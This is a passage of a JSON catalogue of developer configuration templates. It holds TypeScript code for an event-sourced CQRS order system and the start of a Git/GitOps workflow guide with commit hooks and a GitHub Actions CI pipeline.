) {}\n\n  async handle(query: GetOrderQuery): Promise<OrderView | null> {\n    const orderReadModel = await this.orderReadModelRepository.findById(query.orderId);\n    \n    if (!orderReadModel) {\n      return null;\n    }\n\n    return {\n      id: orderReadModel.id,\n      customerId: orderReadModel.customerId,\n      status: orderReadModel.status,\n      items: orderReadModel.items.map(item => ({\n        productId: item.productId,\n        productName: item.productName,\n        quantity: item.quantity,\n        unitPrice: item.unitPrice,\n        totalPrice: item.totalPrice\n      })),\n      totalAmount: orderReadModel.totalAmount,\n      createdAt: orderReadModel.createdAt,\n      confirmedAt: orderReadModel.confirmedAt,\n      cancelledAt: orderReadModel.cancelledAt\n    };\n  }\n}\n```\n\n## Event Store Implementation\n\n### Event Store Interface\n```typescript\n// src/shared/infrastructure/eventstore/EventStore.ts\nimport { DomainEvent } from '../../domain/base/DomainEvent';\nimport { EventStream } from './EventStream';\n\nexport interface EventStore {\n  saveEvents(\n    aggregateId: string,\n    events: DomainEvent[],\n    expectedVersion: number\n  ): Promise<void>;\n\n  getEventsForAggregate(\n    aggregateId: string,\n    fromVersion?: number\n  ): Promise<EventStream>;\n\n  getAllEvents(\n    fromPosition?: number,\n    maxCount?: number\n  ): Promise<DomainEvent[]>;\n\n  subscribeToAll(\n    onEvent: (event: DomainEvent) => Promise<void>,\n    onError?: (error: Error) => void\n  ): Promise<void>;\n\n  subscribeToStream(\n    streamName: string,\n    onEvent: (event: DomainEvent) => Promise<void>,\n    onError?: (error: Error) => void\n  ): Promise<void>;\n}\n```\n\n### EventStore DB Implementation\n```typescript\n// src/shared/infrastructure/eventstore/EventStoreDbImplementation.ts\nimport { EventStore } from './EventStore';\nimport { DomainEvent } from '../../domain/base/DomainEvent';\nimport { EventStream } from './EventStream';\nimport { EventStoreDBClient, jsonEvent } from '@eventstore/db-client';\n\nexport class EventStoreDbImplementation implements EventStore {\n  constructor(private client: EventStoreDBClient) {}\n\n  async saveEvents(\n    aggregateId: string,\n    events: DomainEvent[],\n    expectedVersion: number\n  ): Promise<void> {\n    const streamName = `order-${aggregateId}`;\n    \n    const eventData = events.map(event => \n      jsonEvent({\n        type: event.getEventName(),\n        data: {\n          ...event.getEventData(),\n          aggregateId: event.aggregateId,\n          eventVersion: event.eventVersion,\n          occurredOn: event.occurredOn.toISOString(),\n          eventId: event.eventId\n        }\n      })\n    );\n\n    try {\n      await this.client.appendToStream(streamName, eventData, {\n        expectedRevision: expectedVersion === 0 ? 'no_stream' : BigInt(expectedVersion - 1)\n      });\n    } catch (error) {\n      if (error.type === 'wrong-expected-version') {\n        throw new Error(`Concurrency conflict for aggregate ${aggregateId}`);\n      }\n      throw error;\n    }\n  }\n\n  async getEventsForAggregate(\n    aggregateId: string,\n    fromVersion: number = 0\n  ): Promise<EventStream> {\n    const streamName = `order-${aggregateId}`;\n    \n    try {\n      const events = this.client.readStream(streamName, {\n        fromRevision: BigInt(fromVersion),\n        direction: 'forwards',\n        maxCount: 1000\n      });\n\n      const domainEvents: DomainEvent[] = [];\n      \n      for await (const resolvedEvent of events) {\n        const eventData = resolvedEvent.event?.data;\n        if (eventData) {\n          const domainEvent = this.deserializeEvent(\n            resolvedEvent.event.type,\n            eventData\n          );\n          domainEvents.push(domainEvent);\n        }\n      }\n\n      return new EventStream(aggregateId, domainEvents, domainEvents.length);\n    } catch (error) {\n      if (error.type === 'stream-not-found') {\n        return new EventStream(aggregateId, [], 0);\n      }\n      throw error;\n    }\n  }\n\n  async getAllEvents(\n    fromPosition: number = 0,\n    maxCount: number = 1000\n  ): Promise<DomainEvent[]> {\n    const events = this.client.readAll({\n      fromPosition: fromPosition > 0 ? { prepare: BigInt(fromPosition), commit: BigInt(fromPosition) } : 'start',\n      direction: 'forwards',\n      maxCount\n    });\n\n    const domainEvents: DomainEvent[] = [];\n    \n    for await (const resolvedEvent of events) {\n      const eventData = resolvedEvent.event?.data;\n      if (eventData) {\n        const domainEvent = this.deserializeEvent(\n          resolvedEvent.event.type,\n          eventData\n        );\n        domainEvents.push(domainEvent);\n      }\n    }\n\n    return domainEvents;\n  }\n\n  async subscribeToAll(\n    onEvent: (event: DomainEvent) => Promise<void>,\n    onError?: (error: Error) => void\n  ): Promise<void> {\n    const subscription = this.client.subscribeToAll({\n      fromPosition: 'start'\n    });\n\n    for await (const resolvedEvent of subscription) {\n      try {\n        const eventData = resolvedEvent.event?.data;\n        if (eventData) {\n          const domainEvent = this.deserializeEvent(\n            resolvedEvent.event.type,\n            eventData\n          );\n          await onEvent(domainEvent);\n        }\n      } catch (error) {\n        if (onError) {\n          onError(error as Error);\n        } else {\n          console.error('Error processing event:', error);\n        }\n      }\n    }\n  }\n\n  private deserializeEvent(eventType: string, eventData: any): DomainEvent {\n    // Event factory to create concrete event instances\n    // This would typically use a registry pattern\n    switch (eventType) {\n      case 'OrderCreated':\n        return new OrderCreated(\n          eventData.aggregateId,\n          eventData.eventVersion,\n          eventData.customerId,\n          eventData.items,\n          eventData.totalAmount,\n          new Date(eventData.createdAt),\n          eventData.eventId\n        );\n      // Add other event types...\n      default:\n        throw new Error(`Unknown event type: ${eventType}`);\n    }\n  }\n}\n```\n\n## Saga Pattern Implementation\n\n### Order Processing Saga\n```typescript\n// src/sagas/OrderProcessingSaga.ts\nimport { Saga } from '../shared/infrastructure/sagas/Saga';\nimport { OrderCreated } from '../modules/ordering/domain/events/OrderCreated';\nimport { PaymentProcessed } from '../modules/payment/domain/events/PaymentProcessed';\nimport { InventoryReserved } from '../modules/inventory/domain/events/InventoryReserved';\nimport { CommandBus } from '../shared/infrastructure/messaging/CommandBus';\nimport { ProcessPaymentCommand } from '../modules/payment/application/commands/ProcessPayment/ProcessPaymentCommand';\nimport { ReserveInventoryCommand } from '../modules/inventory/application/commands/ReserveInventory/ReserveInventoryCommand';\nimport { ConfirmOrderCommand } from '../modules/ordering/application/commands/ConfirmOrder/ConfirmOrderCommand';\n\nexport class OrderProcessingSaga extends Saga {\n  private orderData: Map<string, any> = new Map();\n\n  constructor(private commandBus: CommandBus) {\n    super();\n  }\n\n  protected configureSaga(): void {\n    this.startedBy<OrderCreated>(OrderCreated, this.handleOrderCreated.bind(this));\n    this.handles<PaymentProcessed>(PaymentProcessed, this.handlePaymentProcessed.bind(this));\n    this.handles<InventoryReserved>(InventoryReserved, this.handleInventoryReserved.bind(this));\n  }\n\n  private async handleOrderCreated(event: OrderCreated): Promise<void> {\n    const orderId = event.aggregateId;\n    \n    // Store saga state\n    this.orderData.set(orderId, {\n      orderId,\n      customerId: event.customerId,\n      totalAmount: event.totalAmount,\n      items: event.items,\n      paymentProcessed: false,\n      inventoryReserved: false\n    });\n\n    // Start payment processing\n    const processPaymentCommand = new ProcessPaymentCommand(\n      crypto.randomUUID(),\n      orderId,\n      event.customerId,\n      event.totalAmount.amount,\n      event.totalAmount.currency\n    );\n\n    await this.commandBus.send(processPaymentCommand);\n\n    // Start inventory reservation\n    const reserveInventoryCommand = new ReserveInventoryCommand(\n      crypto.randomUUID(),\n      orderId,\n      event.items.map(item => ({\n        productId: item.productId,\n        quantity: item.quantity\n      }))\n    );\n\n    await this.commandBus.send(reserveInventoryCommand);\n  }\n\n  private async handlePaymentProcessed(event: PaymentProcessed): Promise<void> {\n    const orderId = event.orderId;\n    const orderData = this.orderData.get(orderId);\n\n    if (!orderData) {\n      console.warn(`No saga data found for order ${orderId}`);\n      return;\n    }\n\n    orderData.paymentProcessed = true;\n    this.orderData.set(orderId, orderData);\n\n    // Check if we can complete the order\n    await this.tryCompleteOrder(orderId);\n  }\n\n  private async handleInventoryReserved(event: InventoryReserved): Promise<void> {\n    const orderId = event.orderId;\n    const orderData = this.orderData.get(orderId);\n\n    if (!orderData) {\n      console.warn(`No saga data found for order ${orderId}`);\n      return;\n    }\n\n    orderData.inventoryReserved = true;\n    this.orderData.set(orderId, orderData);\n\n    // Check if we can complete the order\n    await this.tryCompleteOrder(orderId);\n  }\n\n  private async tryCompleteOrder(orderId: string): Promise<void> {\n    const orderData = this.orderData.get(orderId);\n\n    if (!orderData) {\n      return;\n    }\n\n    // Check if all conditions are met\n    if (orderData.paymentProcessed && orderData.inventoryReserved) {\n      // Confirm the order\n      const confirmOrderCommand = new ConfirmOrderCommand(orderId);\n      await this.commandBus.send(confirmOrderCommand);\n\n      // Clean up saga state\n      this.orderData.delete(orderId);\n      this.markAsComplete();\n    }\n  }\n}\n```\n\n## Read Model Projections\n\n### Order Projection Handler\n```typescript\n// src/modules/ordering/infrastructure/projections/OrderProjectionHandler.ts\nimport { EventHandler } from '../../../shared/infrastructure/EventHandler';\nimport { OrderCreated } from '../../domain/events/OrderCreated';\nimport { OrderConfirmed } from '../../domain/events/OrderConfirmed';\nimport { OrderCancelled } from '../../domain/events/OrderCancelled';\nimport { OrderReadModel } from './OrderReadModel';\nimport { OrderReadModelRepository } from './OrderReadModelRepository';\n\nexport class OrderProjectionHandler implements EventHandler {\n  constructor(\n    private orderReadModelRepository: OrderReadModelRepository\n  ) {}\n\n  async handle(event: any): Promise<void> {\n    switch (event.constructor.name) {\n      case 'OrderCreated':\n        await this.handleOrderCreated(event as OrderCreated);\n        break;\n      case 'OrderConfirmed':\n        await this.handleOrderConfirmed(event as OrderConfirmed);\n        break;\n      case 'OrderCancelled':\n        await this.handleOrderCancelled(event as OrderCancelled);\n        break;\n    }\n  }\n\n  private async handleOrderCreated(event: OrderCreated): Promise<void> {\n    const orderReadModel = new OrderReadModel(\n      event.aggregateId,\n      event.customerId,\n      'PENDING',\n      event.items,\n      event.totalAmount,\n      event.createdAt\n    );\n\n    await this.orderReadModelRepository.save(orderReadModel);\n  }\n\n  private async handleOrderConfirmed(event: OrderConfirmed): Promise<void> {\n    const orderReadModel = await this.orderReadModelRepository.findById(event.aggregateId);\n    \n    if (orderReadModel) {\n      orderReadModel.status = 'CONFIRMED';\n      orderReadModel.confirmedAt = event.confirmedAt;\n      await this.orderReadModelRepository.save(orderReadModel);\n    }\n  }\n\n  private async handleOrderCancelled(event: OrderCancelled): Promise<void> {\n    const orderReadModel = await this.orderReadModelRepository.findById(event.aggregateId);\n    \n    if (orderReadModel) {\n      orderReadModel.status = 'CANCELLED';\n      orderReadModel.cancelledAt = event.cancelledAt;\n      orderReadModel.cancellationReason = event.reason;\n      await this.orderReadModelRepository.save(orderReadModel);\n    }\n  }\n}\n```\n\n## Message Bus Implementation\n\n### Event Publisher\n```typescript\n// src/shared/infrastructure/messaging/EventPublisher.ts\nimport { DomainEvent } from '../../domain/base/DomainEvent';\n\nexport interface EventPublisher {\n  publish(event: DomainEvent): Promise<void>;\n  publishBatch(events: DomainEvent[]): Promise<void>;\n}\n\nexport class RabbitMQEventPublisher implements EventPublisher {\n  constructor(\n    private connection: any, // RabbitMQ connection\n    private exchangeName: string = 'domain.events'\n  ) {}\n\n  async publish(event: DomainEvent): Promise<void> {\n    const channel = await this.connection.createChannel();\n    \n    try {\n      await channel.assertExchange(this.exchangeName, 'topic', { durable: true });\n      \n      const routingKey = `${event.constructor.name.toLowerCase()}`;\n      const message = JSON.stringify({\n        eventId: event.eventId,\n        eventType: event.getEventName(),\n        aggregateId: event.aggregateId,\n        eventVersion: event.eventVersion,\n        occurredOn: event.occurredOn.toISOString(),\n        data: event.getEventData()\n      });\n\n      await channel.publish(\n        this.exchangeName,\n        routingKey,\n        Buffer.from(message),\n        {\n          persistent: true,\n          messageId: event.eventId,\n          timestamp: event.occurredOn.getTime(),\n          type: event.getEventName()\n        }\n      );\n\n      console.log(`Published event: ${event.getEventName()} for aggregate ${event.aggregateId}`);\n    } finally {\n      await channel.close();\n    }\n  }\n\n  async publishBatch(events: DomainEvent[]): Promise<void> {\n    const channel = await this.connection.createChannel();\n    \n    try {\n      await channel.assertExchange(this.exchangeName, 'topic', { durable: true });\n      \n      for (const event of events) {\n        const routingKey = `${event.constructor.name.toLowerCase()}`;\n        const message = JSON.stringify({\n          eventId: event.eventId,\n          eventType: event.getEventName(),\n          aggregateId: event.aggregateId,\n          eventVersion: event.eventVersion,\n          occurredOn: event.occurredOn.toISOString(),\n          data: event.getEventData()\n        });\n\n        await channel.publish(\n          this.exchangeName,\n          routingKey,\n          Buffer.from(message),\n          {\n            persistent: true,\n            messageId: event.eventId,\n            timestamp: event.occurredOn.getTime(),\n            type: event.getEventName()\n          }\n        );\n      }\n\n      console.log(`Published ${events.length} events in batch`);\n    } finally {\n      await channel.close();\n    }\n  }\n}\n```\n\n## Monitoring and Observability\n\n### Event Metrics Collection\n```typescript\n// src/shared/infrastructure/monitoring/EventMetrics.ts\nimport { register, Counter, Histogram, Gauge } from 'prom-client';\n\nexport class EventMetrics {\n  private static instance: EventMetrics;\n  \n  private eventsPublished = new Counter({\n    name: 'events_published_total',\n    help: 'Total number of events published',\n    labelNames: ['event_type', 'aggregate_type']\n  });\n\n  private eventsProcessed = new Counter({\n    name: 'events_processed_total',\n    help: 'Total number of events processed',\n    labelNames: ['event_type', 'handler_type']\n  });\n\n  private eventProcessingDuration = new Histogram({\n    name: 'event_processing_duration_seconds',\n    help: 'Duration of event processing',\n    labelNames: ['event_type', 'handler_type'],\n    buckets: [0.001, 0.005, 0.01, 0.05, 0.1, 0.5, 1, 5, 10]\n  });\n\n  private activeProjections = new Gauge({\n    name: 'active_projections',\n    help: 'Number of active projection handlers'\n  });\n\n  private sagasInProgress = new Gauge({\n    name: 'sagas_in_progress',\n    help: 'Number of sagas currently in progress'\n  });\n\n  static getInstance(): EventMetrics {\n    if (!EventMetrics.instance) {\n      EventMetrics.instance = new EventMetrics();\n    }\n    return EventMetrics.instance;\n  }\n\n  recordEventPublished(eventType: string, aggregateType: string): void {\n    this.eventsPublished.inc({ event_type: eventType, aggregate_type: aggregateType });\n  }\n\n  recordEventProcessed(eventType: string, handlerType: string): void {\n    this.eventsProcessed.inc({ event_type: eventType, handler_type: handlerType });\n  }\n\n  recordEventProcessingDuration(\n    eventType: string,\n    handlerType: string,\n    duration: number\n  ): void {\n    this.eventProcessingDuration\n      .labels({ event_type: eventType, handler_type: handlerType })\n      .observe(duration);\n  }\n\n  setActiveProjections(count: number): void {\n    this.activeProjections.set(count);\n  }\n\n  setSagasInProgress(count: number): void {\n    this.sagasInProgress.set(count);\n  }\n}\n```\n\n## Testing Strategies\n\n### Integration Test Example\n```typescript\n// tests/integration/OrderProcessing.test.ts\nimport { describe, it, expect, beforeEach, afterEach } from '@jest/globals';\nimport { TestContainer } from '../helpers/TestContainer';\nimport { CreateOrderCommand } from '../../src/modules/ordering/application/commands/CreateOrder/CreateOrderCommand';\nimport { GetOrderQuery } from '../../src/modules/ordering/application/queries/GetOrder/GetOrderQuery';\n\ndescribe('Order Processing Integration', () => {\n  let container: TestContainer;\n\n  beforeEach(async () => {\n    container = new TestContainer();\n    await container.initialize();\n  });\n\n  afterEach(async () => {\n    await container.cleanup();\n  });\n\n  it('should process complete order workflow', async () => {\n    // Arrange\n    const orderId = crypto.randomUUID();\n    const customerId = crypto.randomUUID();\n    \n    const createOrderCommand = new CreateOrderCommand(\n      orderId,\n      customerId,\n      [\n        {\n          productId: 'product-1',\n          productName: 'Test Product',\n          quantity: 2,\n          unitPrice: 10.00,\n          currency: 'USD'\n        }\n      ]\n    );\n\n    // Act - Create order\n    await container.commandBus.send(createOrderCommand);\n\n    // Wait for saga completion\n    await container.waitForEventProcessing();\n\n    // Assert - Check order was created and confirmed\n    const getOrderQuery = new GetOrderQuery(orderId);\n    const orderView = await container.queryBus.send(getOrderQuery);\n\n    expect(orderView).toBeDefined();\n    expect(orderView!.id).toBe(orderId);\n    expect(orderView!.customerId).toBe(customerId);\n    expect(orderView!.status).toBe('CONFIRMED');\n    expect(orderView!.items).toHaveLength(1);\n    expect(orderView!.totalAmount).toBe(20.00);\n  });\n\n  it('should handle inventory shortage gracefully', async () => {\n    // Arrange - Configure inventory to be insufficient\n    await container.inventoryService.setProductStock('product-1', 1);\n    \n    const createOrderCommand = new CreateOrderCommand(\n      crypto.randomUUID(),\n      crypto.randomUUID(),\n      [\n        {\n          productId: 'product-1',\n          productName: 'Test Product',\n          quantity: 5, // More than available stock\n          unitPrice: 10.00,\n          currency: 'USD'\n        }\n      ]\n    );\n\n    // Act\n    await container.commandBus.send(createOrderCommand);\n    await container.waitForEventProcessing();\n\n    // Assert - Order should be cancelled due to insufficient inventory\n    const orderView = await container.queryBus.send(\n      new GetOrderQuery(createOrderCommand.orderId)\n    );\n\n    expect(orderView!.status).toBe('CANCELLED');\n  });\n});\n```\n\n## Performance Optimization\n\n### Event Batching Strategy\n- **Batch Size**: Optimal batch sizes for different event types\n- **Temporal Batching**: Time-based batching for high-frequency events\n- **Priority Queues**: Different processing priorities for event types\n- **Backpressure Handling**: Graceful degradation under high load\n\n### Read Model Optimization\n- **Denormalization**: Optimized read models for specific queries\n- **Caching Strategy**: Multi-level caching for frequently accessed data\n- **Async Updates**: Asynchronous read model updates\n- **Eventual Consistency**: Handling and monitoring consistency lag\n\n### Saga Management\n- **State Persistence**: Durable saga state storage\n- **Timeout Handling**: Automatic saga timeout and compensation\n- **Compensation Logic**: Rollback mechanisms for failed workflows\n- **Monitoring**: Saga health and progress monitoring\n\nThis event-driven architecture with CQRS provides a robust foundation for building scalable, maintainable distributed systems that can handle complex business workflows while maintaining data consistency and system resilience.",
      "tags": [
        {
          "tag": {
            "id": "event-driven",
            "name": "event-driven",
            "slug": "event-driven"
          }
        },
        {
          "tag": {
            "id": "cqrs",
            "name": "cqrs",
            "slug": "cqrs"
          }
        },
        {
          "tag": {
            "id": "event-sourcing",
            "name": "event-sourcing",
            "slug": "event-sourcing"
          }
        },
        {
          "tag": {
            "id": "messaging",
            "name": "messaging",
            "slug": "messaging"
          }
        },
        {
          "tag": {
            "id": "saga",
            "name": "saga",
            "slug": "saga"
          }
        },
        {
          "tag": {
            "id": "ddd",
            "name": "ddd",
            "slug": "ddd"
          }
        },
        {
          "tag": {
            "id": "microservices",
            "name": "microservices",
            "slug": "microservices"
          }
        }
      ],
      "author": {
        "name": "Claude Code Community",
        "url": "https://github.com/claudecode-community"
      },
      "stats": {
        "votes": 35,
        "copies": 59
      },
      "_count": {
        "votes": 32,
        "copies": 145
      },
      "difficulty": "ADVANCED",
      "language": "TypeScript",
      "framework": "Node.js + Event Store + Message Bus",
      "createdAt": "2024-12-01",
      "lastUpdated": "2024-12-01",
      "featured": false
    },
    {
      "id": "git-workflows-advanced",
      "title": "Advanced Git Workflows + GitOps",
      "slug": "advanced-git-workflows-gitops-automation",
      "tagline": "Git + GitHub Actions + ArgoCD configuration for advanced developers",
      "description": "Comprehensive Git workflow automation with GitOps principles, release automation, advanced branching strategies, and CI/CD integration for enterprise-scale development teams.",
      "categoryId": "claude-configs",
      "category": {
        "id": "claude-configs",
        "name": "Claude.md Configurations",
        "slug": "claude-configs",
        "description": "Ready-to-use Claude.md configuration files for different tech stacks and project types, including advanced enterprise-grade configurations.",
        "icon": "📋",
        "color": "#F59E0B"
      },
      "type": "CONFIGURATION",
      "content": "# Claude.md - Advanced Git Workflows + GitOps\n\n## Project Overview\n\nThis is an advanced Git workflow configuration designed for enterprise-scale development teams that require sophisticated branching strategies, automated release management, GitOps principles, and comprehensive CI/CD integration. It provides battle-tested patterns for managing complex codebases with multiple teams and deployment environments.\n\n## Development Philosophy\n\n### GitOps Principles\n1. **Declarative Configuration**: Infrastructure and applications defined declaratively\n2. **Version Controlled**: All configuration stored in Git repositories\n3. **Automated Deployment**: Changes automatically deployed via Git operations\n4. **Convergence**: Systems automatically converge to desired state\n5. **Observability**: Full audit trail of all changes\n\n### Advanced Git Workflow Benefits\n- **Parallel Development**: Multiple features developed simultaneously\n- **Release Management**: Automated versioning and changelog generation\n- **Quality Gates**: Automated testing and approval processes\n- **Rollback Capability**: Safe rollback to any previous state\n- **Branch Protection**: Enforced code review and testing requirements\n- **Semantic Versioning**: Automated version bumping based on commit messages\n\n## Technology Stack\n\n- **Version Control**: Git with advanced hooks and automation\n- **Repository Platform**: GitHub/GitLab with enterprise features\n- **CI/CD**: GitHub Actions / GitLab CI / Jenkins\n- **GitOps**: ArgoCD / Flux for Kubernetes deployments\n- **Release Management**: Semantic Release / Release Please\n- **Code Quality**: Pre-commit hooks, SonarQube, CodeClimate\n- **Security**: Dependabot, Snyk, Git secret scanning\n\n## Project Structure\n\n```\nenterprise-git-workflows/\n├── .github/                          # GitHub-specific configurations\n│   ├── workflows/                    # GitHub Actions CI/CD\n│   │   ├── ci.yml                   # Continuous Integration\n│   │   ├── cd.yml                   # Continuous Deployment\n│   │   ├── release.yml              # Automated releases\n│   │   ├── security.yml             # Security scanning\n│   │   └── gitops-sync.yml          # GitOps synchronization\n│   ├── PULL_REQUEST_TEMPLATE.md     # PR template\n│   ├── ISSUE_TEMPLATE/              # Issue templates\n│   └── CODEOWNERS                   # Code ownership rules\n├── .gitops/                         # GitOps configurations\n│   ├── applications/                # Application definitions\n│   │   ├── staging/                 # Staging environment\n│   │   ├── production/              # Production environment\n│   │   └── development/             # Development environment\n│   ├── infrastructure/              # Infrastructure as Code\n│   │   ├── terraform/               # Terraform configurations\n│   │   ├── helm/                    # Helm charts\n│   │   └── kustomize/               # Kustomize overlays\n│   └── policies/                    # OPA policies\n├── scripts/                         # Automation scripts\n│   ├── git-hooks/                   # Git hook scripts\n│   │   ├── pre-commit               # Pre-commit validation\n│   │   ├── pre-push                 # Pre-push validation\n│   │   ├── commit-msg               # Commit message validation\n│   │   └── post-merge               # Post-merge actions\n│   ├── release/                     # Release automation\n│   │   ├── prepare-release.sh       # Release preparation\n│   │   ├── generate-changelog.sh    # Changelog generation\n│   │   └── tag-version.sh          # Version tagging\n│   ├── quality/                     # Code quality scripts\n│   │   ├── run-tests.sh            # Test execution\n│   │   ├── lint-code.sh            # Code linting\n│   │   └── security-scan.sh        # Security scanning\n│   └── gitops/                      # GitOps utilities\n│       ├── sync-manifests.sh        # Manifest synchronization\n│       ├── promote-release.sh       # Release promotion\n│       └── rollback.sh              # Rollback automation\n├── docs/                            # Documentation\n│   ├── git-workflow-guide.md        # Workflow documentation\n│   ├── branching-strategy.md        # Branching strategy\n│   ├── release-process.md           # Release process\n│   └── troubleshooting.md           # Common issues\n├── .pre-commit-config.yaml          # Pre-commit configuration\n├── .releaserc.json                  # Semantic release config\n├── BRANCHING_STRATEGY.md            # Branching strategy doc\n└── GIT_WORKFLOW.md                  # Workflow guide\n```\n\n## Branching Strategy\n\n### GitFlow Enhanced Model\n```\nmain (production)           ──●──────●──────●──────●──\n                              │      │      │      │\nrelease/v2.1.0               ●──●──●──●      │      │\n                             │     │         │      │\ndevelop (integration)    ──●──●──●──●──●──●──●──●──●──\n                           │  │     │  │     │  │\nfeature/user-auth       ──●──●──●──│  │     │  │\n                              │     │  │     │  │\nfeature/payment-flow       ──●──●──●──│     │  │\n                                     │     │  │\nhotfix/security-patch             ──●──●──●──│\n                                           │\nbugfix/login-issue                    ──●──●──\n```\n\n### Branch Types and Rules\n1. **main**: Production-ready code, protected, requires PR\n2. **develop**: Integration branch, automated testing\n3. **feature/***: Feature development, created from develop\n4. **release/***: Release preparation, version bumping\n5. **hotfix/***: Critical fixes, created from main\n6. **bugfix/***: Bug fixes, created from develop\n\n## Git Hooks Configuration\n\n### Pre-commit Hook\n```bash\n#!/bin/bash\n# .git/hooks/pre-commit\n\nset -e\n\necho \"🔍 Running pre-commit checks...\"\n\n# Check for merge conflicts\nif grep -r \"<<<<<<< HEAD\" . --exclude-dir=.git; then\n    echo \"❌ Merge conflict markers found. Please resolve conflicts.\"\n    exit 1\nfi\n\n# Prevent commits to protected branches\nBRANCH=$(git rev-parse --abbrev-ref HEAD)\nPROTECTED_BRANCHES=\"^(main|master|develop)$\"\n\nif [[ $BRANCH =~ $PROTECTED_BRANCHES ]]; then\n    echo \"❌ Direct commits to $BRANCH are not allowed. Please use a feature branch.\"\n    exit 1\nfi\n\n# Check commit message format\nCOMMIT_MSG=$(cat .git/COMMIT_EDITMSG 2>/dev/null || echo \"\")\nif [[ ! $COMMIT_MSG =~ ^(feat|fix|docs|style|refactor|test|chore|ci|build|perf)((.+))?: .+ ]]; then\n    echo \"❌ Commit message must follow Conventional Commits format:\"\n    echo \"   <type>[optional scope]: <description>\"\n    echo \"   Example: feat(auth): add OAuth2 login\"\n    exit 1\nfi\n\n# Run code quality checks\necho \"🧹 Running code quality checks...\"\n\n# ESLint for JavaScript/TypeScript\nif command -v npx &> /dev/null && [ -f \"package.json\" ]; then\n    npx eslint . --ext .js,.jsx,.ts,.tsx --fix\nfi\n\n# Black for Python\nif command -v black &> /dev/null && find . -name \"*.py\" | grep -q .; then\n    black --check .\nfi\n\n# Go fmt for Go\nif command -v go &> /dev/null && find . -name \"*.go\" | grep -q .; then\n    go fmt ./...\nfi\n\n# Rust fmt for Rust\nif command -v cargo &> /dev/null && [ -f \"Cargo.toml\" ]; then\n    cargo fmt --check\nfi\n\n# Run tests\necho \"🧪 Running tests...\"\nif [ -f \"package.json\" ] && grep -q '\"test\"' package.json; then\n    npm test -- --passWithNoTests\nfi\n\nif [ -f \"Cargo.toml\" ]; then\n    cargo test\nfi\n\nif find . -name \"*.py\" | grep -q . && [ -f \"requirements.txt\" ]; then\n    python -m pytest --tb=short\nfi\n\n# Security checks\necho \"🔒 Running security checks...\"\n\n# Check for secrets\nif command -v truffleHog &> /dev/null; then\n    truffleHog --regex --entropy=False .\nfi\n\n# Dependency vulnerability check\nif command -v npm &> /dev/null && [ -f \"package.json\" ]; then\n    npm audit --audit-level=moderate\nfi\n\nif command -v cargo &> /dev/null && [ -f \"Cargo.toml\" ]; then\n    cargo audit\nfi\n\necho \"✅ All pre-commit checks passed!\"\n```\n\n### Commit Message Hook\n```bash\n#!/bin/bash\n# .git/hooks/commit-msg\n\nCOMMIT_MSG_FILE=$1\nCOMMIT_MSG=$(cat $COMMIT_MSG_FILE)\n\n# Conventional Commits pattern\nPATTERN=\"^(feat|fix|docs|style|refactor|test|chore|ci|build|perf)((.+))?: .{1,50}\"\n\nif [[ ! $COMMIT_MSG =~ $PATTERN ]]; then\n    echo \"❌ Invalid commit message format!\"\n    echo \"\"\n    echo \"Commit message must follow Conventional Commits specification:\"\n    echo \"\"\n    echo \"Format: <type>[optional scope]: <description>\"\n    echo \"\"\n    echo \"Types:\"\n    echo \"  feat:     A new feature\"\n    echo \"  fix:      A bug fix\"\n    echo \"  docs:     Documentation only changes\"\n    echo \"  style:    Code style changes (formatting, etc.)\"\n    echo \"  refactor: Code refactoring\"\n    echo \"  test:     Adding or updating tests\"\n    echo \"  chore:    Maintenance tasks\"\n    echo \"  ci:       CI/CD related changes\"\n    echo \"  build:    Build system changes\"\n    echo \"  perf:     Performance improvements\"\n    echo \"\"\n    echo \"Examples:\"\n    echo \"  feat(auth): add OAuth2 login support\"\n    echo \"  fix(api): resolve user validation bug\"\n    echo \"  docs: update README with new setup instructions\"\n    echo \"\"\n    exit 1\nfi\n\n# Check description length\nDESCRIPTION=$(echo \"$COMMIT_MSG\" | head -n1 | sed 's/^[^:]*: //')\nif [ ${#DESCRIPTION} -gt 50 ]; then\n    echo \"⚠️  Warning: Commit message description is longer than 50 characters\"\n    echo \"   Consider making it more concise for better readability\"\nfi\n\n# Check for body separation\nif [ $(echo \"$COMMIT_MSG\" | wc -l) -gt 1 ]; then\n    SECOND_LINE=$(echo \"$COMMIT_MSG\" | sed -n '2p')\n    if [ -n \"$SECOND_LINE\" ]; then\n        echo \"❌ Second line of commit message must be blank\"\n        echo \"   Use: <title>\\n\\n<body>\"\n        exit 1\n    fi\nfi\n\necho \"✅ Commit message format is valid\"\n```\n\n## GitHub Actions Workflows\n\n### Continuous Integration\n```yaml\n# .github/workflows/ci.yml\nname: Continuous Integration\n\non:\n  push:\n    branches: [ develop, 'feature/*', 'bugfix/*' ]\n  pull_request:\n    branches: [ main, develop ]\n\nconcurrency:\n  group: ${{ github.workflow }}-${{ github.ref }}\n  cancel-in-progress: true\n\njobs:\n  quality-checks:\n    name: Code Quality & Security\n    runs-on: ubuntu-latest\n    \n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n        with:\n          fetch-depth: 0\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n          cache: 'npm'\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Run ESLint\n        run: npm run lint\n\n      - name: Run Prettier\n        run: npm run format:check\n\n      - name: Type checking\n        run: npm run type-check\n\n      - name: Security audit\n        run: npm audit --audit-level=moderate\n\n      - name: Run tests with coverage\n        run: npm run test:coverage\n\n      - name: Upload coverage to Codecov\n        uses: codecov/codecov-action@v3\n        with:\n          token: ${{ secrets.CODECOV_TOKEN }}\n\n      - name: SonarCloud Scan\n        uses: SonarSource/sonarcloud-github-action@master\n        env:\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}\n\n  build:\n    name: Build & Test\n    runs-on: ubuntu-latest\n    needs: quality-checks\n    \n    strategy:\n      matrix:\n        node-version: [18, 20, 22]\n        \n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n\n      - name: Setup Node.js ${{ matrix.node-version }}\n        uses: actions/setup-node@v4\n        with:\n          node-version: ${{ matrix.node-version }}\n          cache: 'npm'\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Build application\n        run: npm run build\n\n      - name: Run unit tests\n        run: npm run test:unit\n\n      - name: Run integration tests\n        run: npm run test:integration\n\n  e2e-tests:\n    name: End-to-End Tests\n    runs-on: ubuntu-latest\n    needs: build\n    \n    steps:\n      - name: Checkout code\n        uses: actions/checkout@v4\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n          